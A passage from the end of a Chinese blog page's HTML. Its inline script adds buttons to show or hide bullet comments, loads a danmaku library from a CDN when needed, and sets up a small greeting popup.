      document.getElementById('danmu-Btn') && (document.getElementById('danmu-Btn').innerHTML = `<button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.remove('hide-danmu')">显示弹幕</button> <button class="hide-Btn" onclick="document.getElementById('danmu-wrap').classList.add('hide-danmu')">隐藏弹幕</button>`)
    }
    (async () => {
      if (typeof EasyDanmaku === 'function') {
        await naokuo_danmu();
      } else {
        const easyDanmakuScript = await getScript('https://npm.onmicrosoft.cn/naokuo-blog@1.2.12/js/easy-Danmaku.js');
        if (typeof EasyDanmaku === 'function') {
          await naokuo_danmu();
        } else {
          console.error('EasyDanmaku function not found even after loading the script.');
        }
      }
    })();
  }
  getnaokuo_danmu()
  document.addEventListener('pjax:complete', getnaokuo_danmu)
})</script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>